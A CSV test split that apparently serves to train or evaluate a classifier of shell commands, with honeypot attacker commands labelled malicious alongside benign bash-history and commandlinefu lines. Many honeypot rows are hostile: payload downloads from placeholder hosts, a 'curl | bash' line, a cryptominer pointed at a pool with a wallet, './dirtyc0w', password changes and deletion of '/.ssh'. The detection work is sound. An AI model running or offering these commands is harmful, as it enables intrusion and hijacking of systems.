id,command,label,source,split
d2_001928,$ yum install bind-utils,0,bash_history,test
d2_001934,wget http://h7d766682.example.net/key.tgz,1,honeypot,test
d2_001937,apt-get install lighttpd,0,bash_history,test
d2_001939,tar xvf dofailed: Connection refused.,1,honeypot,test
d2_001941,cd /var/run,1,honeypot,test
d2_001949,git remote add origins.top:20443/dev/nikki.git,0,bash_history,test
d2_001952,chomd 777,0,bash_history,test
d2_001961,cat thomas.sh,0,bash_history,test
d2_001964,paplay --help,0,bash_history,test
d2_001967,chmod u+x scriptrabalho,0,bash_history,test
d2_001976,alias whichall='{ command alias; command declare -f; } | command which --read-functions --read-alias -a',0,commandlinefu,test
d2_001977,"/usr/bin/lynx -dump -width 500 http://h4b84b15b.example.net/whm-server-status | awk 'BEGIN { FS = "" "" } ; { print $12 }' | sed '/^$/d' | sort | uniq -c | sort -n",0,commandlinefu,test
d2_001984,reboot && exit,0,bash_history,test
d2_001992,cd 64,1,honeypot,test
d2_001993,du -sch 120717_rerunSSprimaryhepmicroRNA_00093_Evita/Data/,0,bash_history,test
d2_001996,./k1n74Z8p,1,honeypot,test
d2_001998,rm -rf Pemex.sh Pemex.sh Pemex2.sh Pemex1.sh,1,honeypot,test
d2_002013,rm -rf smecherit.tgz,0,bash_history,test
d2_002017,add bash/ compton/ i3/ rofi/ .themes/ .vim/ wallpaper/ .Xresources,0,bash_history,test
d2_002019,cd /bishn/,1,honeypot,test
d2_002022,download,1,honeypot,test
d2_002031,git branch -r,0,bash_history,test
d2_002033,"uptime | awk -F ',' ' {print $1} ' | awk ' {print $3} ' | awk -F ':' ' {hrs=$1; min=$2; print hrs*60 + min} '",0,commandlinefu,test
d2_002035,"ssh root@pyramid \ ""tcpdump -nn -i eth1 -w -"" | snort -c /etc/snort/snort.conf -r -",0,commandlinefu,test
d2_002042,"g ci -m ""Ignore build directory""",0,bash_history,test
d2_002066,git clone git://github.com/sstephenson/rbenv.git .rbenv,0,bash_history,test
d2_002070,make hello.c,0,bash_history,test
d2_002074,sh sh,1,honeypot,test
d2_002076,git diff contents/fractals.tex,0,bash_history,test
d2_002078,"echo -n ""IP Address or Machine Name: ""; read IP; ping -c 1 -q $IP >/dev/null 2>&1 && echo -e ""\e[00;32mOnline\e[00m"" || echo -e ""\e[00;31mOffline\e[00m""",0,commandlinefu,test
d2_002079,curl --ntlm -u DOMAIN/user https://he9da8524.example.net/path/to/file,0,commandlinefu,test
d2_002089,pidof systemd,0,bash_history,test
d2_002092,./c1RUtovP,1,honeypot,test
d2_002098,find . -type f | awk -F'.' '{print $NF}' | sort| uniq -c | sort -g,0,commandlinefu,test
d2_002103,make dependencies,0,bash_history,test
d2_002110,"xrandr --newmode ""1368x768_60.00"" 85.25 1368 1440 1576 1784 768 771 781 798 -hsync +vsync",0,bash_history,test
d2_002113,lsmod | grep fat,0,bash_history,test
d2_002116,git add assets/,0,bash_history,test
d2_002118,sh 18071.sh,1,honeypot,test
d2_002122,curl -O http://hfe11f96b.example.net/8UsA.sh,1,honeypot,test
d2_002131,rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh 8UsA1.sh,1,honeypot,test
d2_002132,curl http://hb967bfcb.example.net/w.txt -o ygljglkjgfg0,1,honeypot,test
d2_002135,ls |grep kod,0,bash_history,test
d2_002139,chmod +x ptUehrfk,1,honeypot,test
d2_002142,where swift,0,bash_history,test
d2_002145,vi teste02,0,bash_history,test
d2_002149,sudo inst cpan,1,honeypot,test
d2_002152,chef exec rspec spec/unit/recipes/default_spec.rb,0,bash_history,test
d2_002160,"for file in $(find . -name *.mp4); do ogv=${file%%.mp4}.ogv; if test ""$file"" -nt ""$ogv""; then echo $file' is newer then '$ogv; ffmpeg2theora $file; fi done",0,commandlinefu,test
d2_002163,./dirtyc0w,1,honeypot,test
d2_002167,m') ; best = getBestServer(servers) ; if not args.simple: ; print_(('\033[1,1,honeypot,test
d2_002170,/bin/busybox rm -f /sys/fs/cgroup/freezer/.nippon,1,honeypot,test
d2_002185,./bjPy7KvD,1,honeypot,test
d2_002186,diff <(ssh server01 'cd config; find . -type f -exec md5sum {} \;| sort -k 2') <(ssh server02 'cd config;find . -type f -exec md5sum {} \;| sort -k 2'),0,commandlinefu,test
d2_002191,while :; do ping -W1 -c1 -n 84.166.54.191 > /dev/null || tput bel > /dev/console; sleep 1; done,0,commandlinefu,test
d2_002197,"emacs --role ""emacs"" --name ""emacs""",0,bash_history,test
d2_002201,perl kbk,1,honeypot,test
d2_002202,pw,0,bash_history,test
d2_002210,""""""" ; fp = kwargs.pop(""file"", sys.stdout) ; if fp is None: ; return ; def write(data): ; if not isinstance(data, basestring): ; data = str(data) ; fp.write(data) ; want_unicode = False ; sep = kwargs.pop(""sep"", None) ; if sep is not None: ; if isinstance(sep, unicode): ; want_unicode = True ; elif not isinstance(sep, str): ; raise TypeError(""sep must be None or a string"") ; end = kwargs.pop(""end"", None) ; if end is not None: ; if isinstance(end, unicode): ; want_unicode = True ; elif not isinstance(end, str): ; raise TypeError(""end must be None or a string"") ; if kwargs: ; raise TypeError(""invalid keyword arguments to print()"") ; if not want_unicode: ; for arg in args: ; if isinstance(arg, unicode): ; want_unicode = True ; break ; if want_unicode: ; newline = unicode(""\n"") ; space = unicode("" "") ; else: ; newline = ""\n"" ; space = "" "" ; if sep is None: ; sep = space ; if end is None: ; end = newline ; for i, arg in enumerate(args): ; if i: ; write(sep) ; write(arg) ; write(end) ; else: ; print_ = getattr(builtins, 'print') ; del builtins ; class SpeedtestCliServerListError(Exception): ; """"""Internal Exception class used to indicate to move on to the next",1,honeypot,test
d2_002211,man lpoptions,0,bash_history,test
d2_002233,bash -x script.sh 2> log,0,commandlinefu,test
d2_002235,sudo showkey -k,0,commandlinefu,test
d2_002238,xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 xinput test,0,commandlinefu,test
d2_002240,"mycommand 2> >(while read line; do echo -e ""\e[01;31m$line\e[0m""; done)",0,commandlinefu,test
d2_002242,dig slashdot.org,0,bash_history,test
d2_002245,sudo mv -R deurbel /etc/services/deurbel,0,bash_history,test
d2_002246,sudo mv *9560* ~/boot_backup/,0,bash_history,test
d2_002252,z0rmsh0gu,1,honeypot,test
d2_002260,vim .ICEauthority,0,bash_history,test
d2_002267,LC_ALL=C ss -tln,1,honeypot,test
d2_002276,mv fullcompile,0,bash_history,test
d2_002279,nano gmail.php,0,bash_history,test
d2_002284,docker rmi rsyslog/syslog_appliance_alpine,0,bash_history,test
d2_002291,// Replace abi-tasks-dev and abi-tasks-prod with,0,bash_history,test
d2_002295,QWEdsa1@#,1,honeypot,test
d2_002296,vi casegoodmorning.sh,0,bash_history,test
d2_002308,./J9zQyPPX,1,honeypot,test
d2_002313,./x86 Servers,1,honeypot,test
d2_002314,"cut -d"","" -f9",0,commandlinefu,test
d2_002315,./G66URQK2,1,honeypot,test
d2_002322,m]\033[1,1,honeypot,test
d2_002332,mplayer vokoscreen-2017-04-26_23-12-29_edit_8_7_Call_To_Action_Buttons.mp4,0,bash_history,test
d2_002333,./usgBrsDs,1,honeypot,test
d2_002334,cat part1.avi part2.avi part3.avi > tmp.avi && mencoder -forceidx -oac copy -ovc copy tmp.avi -o output.avi && rm -f tmp.avi,0,commandlinefu,test
d2_002337,ssh bos-lvthz.bos01.kendall.corp.akamai.com,0,bash_history,test
d2_002340,pacman -S kdebase-konsole,0,bash_history,test
d2_002352,more selftyperedeclared.test,0,bash_history,test
d2_002353,feh --bg-fill ~/Pictures/Wallpapers/alchemical_wbb.jpg,0,bash_history,test
d2_002356,./k1337.x86,1,honeypot,test
d2_002361,rr .gitignore,0,bash_history,test
d2_002370,lwp-download http://h7642432e.example.net/2start.jpg /tmp/2start.jpg,1,honeypot,test
d2_002382,man cbq,0,bash_history,test
d2_002386,cat -n diretorio,0,bash_history,test
d2_002387,uberwriter,0,bash_history,test
d2_002391,tar zxvf udp.tgz,0,bash_history,test
d2_002397,sudo passwd ubuntu,0,bash_history,test
d2_002398,bundle exec rails c,0,bash_history,test
d2_002400,tar xvf ha.tgz,0,bash_history,test
d2_002402,say WORD,0,commandlinefu,test
d2_002405,ls .cu,0,bash_history,test
d2_002414,rm -rf /.ssh,1,honeypot,test
d2_002418,ll -h PG0002526-DNA_fastq/,0,bash_history,test
d2_002426,./Mycroft-QtApplication-x86_64.AppImage,0,bash_history,test
d2_002430,wget http://h933e1e39.example.net/Senpai.sh,1,honeypot,test
d2_002449,wgets.com/sites/default/files/download/SW/V2.1.0/WebGrabPlus_V2.1_install.tar.gz,0,bash_history,test
d2_002452,iconv -f utf8 -t ascii//TRANSLIT <output-file>,0,commandlinefu,test
d2_002453,git clones.top/mekong/WA-Vetlink.git .,0,bash_history,test
d2_002457,./a21jj,1,honeypot,test
d2_002460,- name: mongo-container,0,bash_history,test
d2_002461,vim index.php,0,bash_history,test
d2_002466,"tar -czvvf backup$(date ""+%Y%m%d_%H%M%S"").tar.gz /path/to/dir",0,commandlinefu,test
d2_002471,w3m localhost,0,bash_history,test
d2_002475,rm Image,0,bash_history,test
d2_002479,LC_ALL=C /home/admin/.dhpcd -o 76.132.177.92:4444 -t4 --safe -B >/dev/null 2>/dev/null,1,honeypot,test
d2_002480,make [target] VAR=foobar,0,commandlinefu,test
d2_002484,./configure --prefix=/opt/cross,0,bash_history,test
d2_002488,python3 test_Publish.py 111 222,0,bash_history,test
d2_002501,ls -kl,0,bash_history,test
d2_002507,ls ~/.local/lib/python2.7/site-packages/,0,bash_history,test
d2_002517,curlsercontent.com/aurora/rmate/master/rmate > rmate,0,bash_history,test
d2_002519,apt-get install tomcat7-docs tomcat7-admin tomcat7-examples,0,bash_history,test
d2_002525,"while [ 1 ]; do banner 'ze missiles, zey are coming! ' | while IFS=""\n"" read l; do echo ""$l""; sleep 0.01; done; done",0,commandlinefu,test
d2_002533,sudo nano /edx/app/edxapp/edx-platform/conf/locale/ar/,0,bash_history,test
d2_002534,tail debug.log,0,bash_history,test
d2_002538,sudo systemctl start vmware-networks.service,0,bash_history,test
d2_002539,ls --color,0,bash_history,test
d2_002553,vim /usr/src/linux/,0,bash_history,test
d2_002557,service xinetd stop,0,bash_history,test
d2_002559,vim .ssh/id_rsa.pub,0,bash_history,test
d2_002562,LC_ALL=C rm -f /dev/shm/029jwwvfan02qmytjo22l7blv7,1,honeypot,test
d2_002573,sudo modprobe rtsx_pci_ms,0,bash_history,test
d2_002582,"git commit -m ""first commit""testproj",0,bash_history,test
d2_002592,./cnrig -o 68.198.238.17:5555 -u (44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A) -p victor+dihef44682@link3mail.com -t,1,honeypot,test
d2_002593,wget -q http://h03013622.example.net/servicesd000/fx19.x86,1,honeypot,test
d2_002594,IFS=:; find $PATH | grep pattern,0,commandlinefu,test
d2_002601,/bin/busybox cat /sys/fs/cgroup/freezer/.nippon,1,honeypot,test
d2_002605,./FrqD6cQm,1,honeypot,test
d2_002608,ssh -o 'StrictHostKeyChecking no' root@59.105.229.242,0,bash_history,test
d2_002623,find /home/dir -mtime +1 -print -exec gzip -9 {} \; -exec mv {}.gz {}_`date +%F`.gz \;,0,commandlinefu,test
d2_002629,zxi,0,bash_history,test
d2_002633,"find . -name ""whatever.*"" -print0 | rsync -av --files-from=- --from0 ./ ./destination/",0,commandlinefu,test
d2_002636,watch -n60 --kill -USR1 $(pgrep dd),0,commandlinefu,test
d2_002638,dpkg --get-selections | grep linux-image,0,commandlinefu,test
d2_002644,gcc test.c -o test,0,bash_history,test
d2_002647,ruler() { for s in '....^....|' '1234567890'; do w=${#s}; str=$( for (( i=1; $i<=$(( ($COLUMNS + $w) / $w )) ; i=$i+1 )); do echo -n $s; done ); str=$(echo $str | cut -c -$COLUMNS) ; echo $str; done; },0,commandlinefu,test
d2_002650,ls /var/log -all,0,bash_history,test
d2_002653,"services() { printf ""$(service --status-all 2>&1|sed -e 's/\[ + \]/\\E\[42m\[ + \]\\E\[0m/g' -e 's/\[ - \]/\\E\[41m\[ - \]\\E\[0m/g' -e 's/\[ ? \]/\\E\[43m\[ ? \]\\E\[0m/g')\n"";}",0,commandlinefu,test
d2_002656,cd go,1,honeypot,test
d2_002659,for i in `openstack baremetal node list -c UUID -f value`; do ironic node-update $i ; done,0,bash_history,test
d2_002663,./O7XgKaIK,1,honeypot,test
d2_002668,find . -name <pattern> -ls | awk 'BEGIN {i=0}; {i=i+$7}; END {print i}',0,commandlinefu,test
d2_002676,bashmount,0,bash_history,test
d2_002689,mplayer -vo null something.mpg,0,commandlinefu,test
d2_002695,cta,0,bash_history,test
d2_002696,sudo deluser bwhite humanresources,0,bash_history,test
d2_002698,omni- configure,0,bash_history,test
d2_002699,cat /tmp/sixnet_status.,0,bash_history,test
d2_002700,sys password 0fj8Hx6W4yH,1,honeypot,test
d2_002708,/var/log/syslog,0,bash_history,test
d2_002711,nano mosquitto.conf.gz,0,bash_history,test
d2_002715,"du -hS / | perl -ne '(m/\d{3,}M\s+\S/ || m/G\s+\S/) && print'",0,commandlinefu,test
d2_002728,vim zenburn,0,bash_history,test
d2_002735,pip install pyLast,0,bash_history,test
d2_002744,echo 'foo' | tee >(wc -c) >(grep o) >(grep f),0,commandlinefu,test
d2_002746,sudo apt-get remove --purge resolvconf,0,bash_history,test
d2_002750,ls -ltr ~/.virtualenvs/,0,bash_history,test
d2_002759,chmod +x arquivobin,0,bash_history,test
d2_002762,cp /etc/wgetrc /top/,0,bash_history,test
d2_002767,rm -rf upp,1,honeypot,test
d2_002774,strace passwd 2>a,0,bash_history,test
d2_002787,yaourt cardano,0,bash_history,test
d2_002788,sudo git add ../tools/,0,bash_history,test
d2_002790,maestro,0,bash_history,test
d2_002806,"ps -eorss,args | sort -nr | pr -TW$COLUMNS | head",0,commandlinefu,test
d2_002813,rm pdf.js,0,bash_history,test
d2_002817,python -m pip --version,0,bash_history,test
d2_002820,rpm -qa wget,0,bash_history,test
d2_002821,systemctl start firewalld,0,bash_history,test
d2_002823,/etc/xinetd.d/,0,bash_history,test
d2_002825,wget `lynx -dump http://h9ea06f54.example.net/ebowtube.php | grep .flv$ | sed 's/[[:blank:]]\+[[:digit:]]\+\. //g'`,0,commandlinefu,test
d2_002828,openssl --version,0,bash_history,test
d2_002830,wget http://h0e6255f0.example.net/Pemex.sh,1,honeypot,test
d2_002832,ls system-tools-backends/,0,bash_history,test
d2_002834,"echo ""${WHI}# ${DRED}Ram ${DRED} -> ${WHI}${ram}MB [1024MB = 1GB]"" #${WHI}"" ; echo ""${WHI}# ${DRED}GPU ${DRED} -> ${WHI}${vid}"" ; echo ""${WHI}# ${DRED}DISK SPACE ${DRED} -> ${WHI}${DISK}"" ; echo ""${WHI}# ${DRED}Versiune ${DRED} -> ${WHI}${VER}"" ; echo ""${WHI}# ${DRED}Uptime ${DRED} -> ${WHI}${zile} Zile"" ; sleep 2 ; if ((${EUID:-0} || ""$(id -u)"")) ; then ; echo ""${WHI}#${DRED} Drept de root -> ${WHI}Nu ai""""${WHI} ${WHI}"" ; sleep 3 ; else ; echo ""${WHI}# ${DRED}Drept de root -> ${WHI}Ai ${WHI}"" ; fi ; sleep 3 ; echo ""${DRED}--------------------------------------------------------------------------${WHI}"" ; echo ""${WHI} | ${WHI}SPEED TESTUL INCEPE IN 3 SECUNDE | ${WHI}"" ; echo ""${DRED}--------------------------------------------------------------------------${WHI}"" ; sleep 1 ; echo ""${DRED} ->${WHI}1${WHI}"" ; sleep 1 ; echo ""${DRED} ->${WHI}2${WHI}"" ; sleep 1 ; echo ""${DRED} ->${WHI}3${WHI}"" ; sleep 1 ; wget nasapaul.com/v.py ; perl v.py y ; perl ninfo ; nano v.py ; #!/usr/bin/env python ; # -*- coding: utf-8 -*- ; # Copyright 2012-2017 Matt Martz ; # All Rights Reserved. ; # ; # Licensed under the Apache License, Version 2.0 (the ""License"") ; you may ; # not use this file except in compliance with the License. You may obtain ; # a copy of the License at ; # ; # http://hf44de385.example.net/licenses/LICENSE-2.0 ; # ; # Unless required by applicable law or agreed to in writing, software ; # distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT ; # WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the ; # License for the specific language governing permissions and limitations ; # under the License. ; # ; # ; # ; import os ; import re ; import sys ; import math ; import signal ; import socket ; import timeit ; import platform ; import threading ; __version__ = '0.3.4' ; # Some global variables we use ; user_agent = None ; source = None ; shutdown_event = None ; scheme = 'http' ; # Used for bound_interface ; socket_socket = socket.socket ; try: ; import xml.etree.cElementTree as ET ; except ImportError: ; try: ; import xml.etree.ElementTree as ET ; except ImportError: ; from xml.dom import minidom as DOM ; ET = None ; # Begin import game to handle Python 2 and Python 3 ; try: ; from urllib2 import urlopen, Request, HTTPError, URLError ; except ImportError: ; from urllib.request import urlopen, Request, HTTPError, URLError ; try: ; from httplib import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py2 = sys.exc_info() ; try: ; from http.client import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py3 = sys.exc_info() ; raise SystemExit('Your python installation is missing required HTTP ' ; 'client classes:\n\n' ; 'Python 2: %s\n' ; 'Python 3: %s' % (e_http_py2[1], e_http_py3[1])) ; try: ; from Queue import Queue ; except ImportError: ; from queue import Queue ; try: ; from urlparse import urlparse ; except ImportError: ; from urllib.parse import urlparse ; try: ; from urlparse import parse_qs ; except ImportError: ; try: ; from urllib.parse import parse_qs ; except ImportError: ; from cgi import parse_qs ; try: ; from hashlib import md5 ; except ImportError: ; from md5 import md5 ; try: ; from argparse import ArgumentParser as ArgParser ; except ImportError: ; from optparse import OptionParser as ArgParser ; try: ; import builtins ; except ImportError: ; def print_(*args, **kwargs): ; """"""The new-style print function taken from",1,honeypot,test
d2_002836,rosrun perception_training track_reporter --experiment_id mgguanjian-TOHS-test_tasks_max_distance20-config0-cloud --output_path mgguanjian-TOHS-test_tasks_max_distance20-config0-cloud.2018.6.15.html,0,bash_history,test
d2_002840,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup' > /sys/fs/cgroup/.nippon,1,honeypot,test
d2_002844,apg -a 0 -n 10,0,commandlinefu,test
d2_002851,gpio -g mode pwm 33,0,bash_history,test
d2_002854,vi update,0,bash_history,test
d2_002858,kmi-client-check sqa2 -r release-pulsar-9590-2017-04-24-19-35 -,0,bash_history,test
d2_002866,ehad jellyfish.kmers.fa,0,bash_history,test
d2_002868,man ftp,0,bash_history,test
d2_002878,git add --all storage/modification/,0,bash_history,test
d2_002894,rm -rf max.*,1,honeypot,test
d2_002905,sudo dnf install bspwm sxhkd,0,bash_history,test
d2_002911,"echo ""zeroshell"" | rm -R /var/libxml_CP",1,honeypot,test
d2_002915,which uptime,1,honeypot,test
d2_002918,nano .htaccess,0,bash_history,test
d2_002924,sudo pip3 install -r requirement.txt,0,bash_history,test
d2_002935,kill -9 13165 14773 32627,0,bash_history,test
d2_002941,rm concatAxoFastqFilesSingleOneLane.sh,0,bash_history,test
d2_002945,ls ../,0,bash_history,test
d2_002956,sed 's/^M$//' input.txt > output.txt,0,commandlinefu,test
d2_002963,yum install passlib,0,bash_history,test
d2_002966,iostat -d -x 10 5,0,commandlinefu,test
d2_002967,chmod +x diretorio,0,bash_history,test
d2_002970,cat teste | uniq -i,0,bash_history,test
d2_002972,systemctl enable sxhkd.service,0,bash_history,test
d2_002973,ore=$(( uptime/60/60%24 )),1,honeypot,test
d2_002977,grep bash /etc/passwd,1,honeypot,test
d2_002979,ps aux|grep syslo,0,bash_history,test
d2_002985,(echo sHIJGkC5aXEqqOl,1,honeypot,test
d2_002986,run ls.sh /home,0,bash_history,test
d2_002996,kill w3m,0,bash_history,test
d2_002997,"alias rot13=""tr a-zA-Z n-za-mN-ZA-M""",0,commandlinefu,test
d2_003000,git add admin/controller/extension/export_import.php,0,bash_history,test
d2_003003,vim block.h,0,bash_history,test
d2_003006,( zcat $FILE || gzcat $FILE || bzcat2 $FILE ) | less,0,commandlinefu,test
d2_003013,service puppetagent status,0,bash_history,test
d2_003014,"uuencode archive.tar.gz archive.tar.gz | mail -s ""Emailing: archive.tar.gz"" user@example.com",0,commandlinefu,test
d2_003015,deluser bwhite contractors,0,bash_history,test
d2_003018,rm -rf coursebuilder_resources_1_11_x/,0,bash_history,test
d2_003019,sudo -H vim /etc/default/grub,0,bash_history,test
d2_003023,"echo boo{,,,,,,,,,,}",0,commandlinefu,test
d2_003028,git ls-tree --name-only,0,bash_history,test
d2_003033,utmpdump /var/log/wtmp,0,commandlinefu,test
d2_003037,LC_ALL=C crontab -l,1,honeypot,test
d2_003039,pkg install python,0,bash_history,test
d2_003047,rem workspaces,0,bash_history,test
d2_003049,./rU3RsTth,1,honeypot,test
d2_003050,sudo apt install -y lynx,0,bash_history,test
d2_003052,netstat -nltp,0,bash_history,test
d2_003053,grep -v $'[^\t\r -~]' my-file-with-non-ascii-characters,0,commandlinefu,test
d2_003060,sudo apt-get install docker-ce=18.03.0~ce-0~ubuntu,0,bash_history,test
d2_003064,./ntpd,1,honeypot,test
d2_003066,cat broadcom/epc4911/gw_scripts/iproute2/rt_tables,0,bash_history,test
d2_003067,rm -rf bash.tgz,1,honeypot,test
d2_003068,g++ hello.cpp,0,bash_history,test
d2_003078,cd /var/tmo,1,honeypot,test
d2_003079,curl -fsSL http://ha1e67547.example.net/2start.jpg | bash -sh,1,honeypot,test
d2_003081,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup/freezer' > /sys/fs/cgroup/freezer/.nippon,1,honeypot,test
d2_003085,l. The\ Cardigans\ -\ Gran\ Turismo\ \(1998\)\[CBR-320\]/,0,bash_history,test
d2_003094,mythtv --status,0,bash_history,test
d2_003102,vim /etc/i3/config,0,bash_history,test
d2_003115,vi Playbooks/playbook1.yml,0,bash_history,test
d2_003116,alsi -s 'screenshot.png',0,bash_history,test
d2_003118,ls .bazaar/,0,bash_history,test
d2_003119,vi you.sh,0,bash_history,test
d2_003132,perl .mm,1,honeypot,test
d2_003134,cat trinity_test/nohup.out,0,bash_history,test
d2_003148,mkdir .z,1,honeypot,test
d2_003151,sudo vi /etc/profile,0,bash_history,test
d2_003153,rm -rf .bot,0,bash_history,test
d2_003155,perl perl-Time-HiRes-1.9760-439.fc31.x86_64.rpm,1,honeypot,test
d2_003156,sudo mv /usr/lib/purple-2/libyahoo-plusplus.so /tmp/,0,bash_history,test
d2_003161,"wget -r -P ./dl/ -A jpg,jpeg http://h71ba300d.example.net",0,commandlinefu,test
d2_003169,"git branch -r | awk -F'/' '{print ""git fetch ""$1,$2}' | xargs -I {} sh -c {}",0,commandlinefu,test
d2_003172,rm -rf dxpol-5.1.tgz,1,honeypot,test
d2_003176,mkdir .themes,0,bash_history,test
d2_003179,echo 'c84fa6b830e38ee8a551df61172d53d7 myfile' | md5sum -c,0,commandlinefu,test
d2_003180,du -s * | sort -n | tail,0,commandlinefu,test
d2_003188,checkrestart,0,commandlinefu,test
d2_003193,sudo netstat -punta,0,commandlinefu,test
d2_003194,cp kp1.txt kp2.txt,0,bash_history,test
d2_003199,tar -xzvf oznminerv2x,1,honeypot,test
d2_003200,cp /home/group/.git/ /home/silar/.git,0,bash_history,test
d2_003206,tar c folder_to_encrypt | openssl enc -aes-256-cbc -e > secret.tar.enc,0,commandlinefu,test
d2_003208,ip_subnet: '188.115.1.173/24',0,bash_history,test
d2_003209,wget http://hdedcf99e.example.net/eBxUk/kjUiwa2.sh,1,honeypot,test
d2_003212,apt-get install zamp,1,honeypot,test
d2_003213,for f in *php; do echo $f >> ~/temp/errors.txt; phpcsw $f | grep GET >> ~/temp/errors.txt; done,0,commandlinefu,test
d2_003215,./sh,1,honeypot,test
d2_003223,perl zyk >>/dev/null,1,honeypot,test
d2_003224,mv test.sh aula_06-03-2012.sh,0,bash_history,test
d2_003228,vim read-boundary.c,0,bash_history,test
d2_003230,man shutdown,0,bash_history,test
d2_003239,"grep -i ""$(date +%b"" ""%d )13:4[0-5]"" syslog",0,commandlinefu,test
d2_003250,./vo4Ps1NH,1,honeypot,test
d2_003256,"yt () mplayer -fs -quiet $(youtube-dl -g ""$1"")",0,commandlinefu,test
d2_003264,/bin/busybox echo -e '\x50\x6f\x72\x74/dev/shm' > /dev/shm/.none,1,honeypot,test
d2_003269,"find -wholename ""*/query/*.json""",0,commandlinefu,test
d2_003270,grep -x arquivotrabalho3,0,bash_history,test
d2_003284,gpg --keyserver hkp://keys.gnupg.net --rec-keys d39dc0e3,0,bash_history,test
d2_003291,man compton,0,bash_history,test
d2_003292,cat count.txt | awk '{ sum+=$1} END {print sum}',0,commandlinefu,test
d2_003296,"find . -type f -name ""*~"" -exec rm {} \;",0,bash_history,test
d2_003304,nohup /root/cong &gt,1,honeypot,test
d2_003311,mv /root/git-1.8.2.tar.gz .,0,bash_history,test
d2_003312,vagrant halt,0,bash_history,test
d2_003314,brew install wget,0,bash_history,test
d2_003319,pip install --upgrade psycopg2-binary,0,bash_history,test
d2_003334,bin/kafka-server-start.sh config/server.properties &,0,bash_history,test
d2_003335,tar xf serv.tar.gz,1,honeypot,test
d2_003337,sh add_num.sh 10,0,bash_history,test
d2_003343,cpu cpu0,0,bash_history,test
d2_003347,sudo mkdir bin,0,bash_history,test
d2_003349,"tail -f /var/log/messages | while read line; do accu=""$line""; while read -t 1 more; do accu=`echo -e ""$accu\n$more""`; done; notify-send ""Syslog"" ""$accu""; done",0,commandlinefu,test
d2_003350,vim ad.yml,0,bash_history,test
d2_003351,ls sec2,0,bash_history,test
d2_003360,find -name .git -prune -o -type f -exec md5sum {} \; | sort -k2 | md5sum,0,commandlinefu,test
d2_003363,cat teste.case.sh,0,bash_history,test
d2_003373,^passwd,1,honeypot,test
d2_003376,echo s1vLE0t8CFc2UyYv) | passwd,1,honeypot,test
d2_003377,OS::TripleO::Compute::Ports::TenantPort: /usr/share/openstack-tripleo-heat-templates/network/ports/tenant_from_pool.yaml,0,bash_history,test
d2_003380,bash: hhneuauf.de]$: command not found,0,bash_history,test
d2_003388,rm -rf .borwind,0,bash_history,test
d2_003389,"sudo apt-get remove $(dpkg -l|awk '/^ii linux-image-/{print $2}'|sed 's/linux-image-//'|awk -v v=`uname -r` 'v>$0'|sed 's/-generic*//'|awk '{printf(""linux-headers-%s\nlinux-headers-%s-generic*\nlinux-image-%s-generic*\n"",$0,$0,$0)}')",0,commandlinefu,test
d2_003394,sh antibinsbins.sh,1,honeypot,test
d2_003401,"echo 'hardstatus alwayslastline "" %d-%m-%y %c:%s | %w""' >> $HOME/.screenrc; screen",0,commandlinefu,test
d2_003407,m') ; print_('\033[1,1,honeypot,test
d2_003411,tail -f <filename> | grep -C <# of lines to show above and below> <text>,0,commandlinefu,test
d2_003416,feh -F .wallpaper/,0,bash_history,test
d2_003419,chgrp -R www-data bootstrap/cache,0,bash_history,test
d2_003427,git flech,0,bash_history,test
d2_003430,rpm2cpio package.rpm |cpio -dimv,0,commandlinefu,test
d2_003443,sudo !-1,0,commandlinefu,test
d2_003444,grep: ./ccsp/CcspCommonLib/source/debug_api/include/.#ccsp_trace.h: No such file or directory,0,bash_history,test
d2_003456,echo linux|rev,0,commandlinefu,test
d2_003466,busybox sh kjUiwa2.sh,1,honeypot,test
d2_003474,"echo -e ""qweasd123\n5xMGcAmmjORl\n5xMGcAmmjORl"" | passwd | bash",1,honeypot,test
d2_003476,python3 -m LittlePigHoHo.manage createsuperuser,0,bash_history,test
d2_003499,less upnpserver.xml,0,bash_history,test
d2_003501,ll],0,bash_history,test
d2_003502,rm -rf Corona.x86_64,1,honeypot,test
d2_003504,convert sample.pdf sample.jpg,0,commandlinefu,test
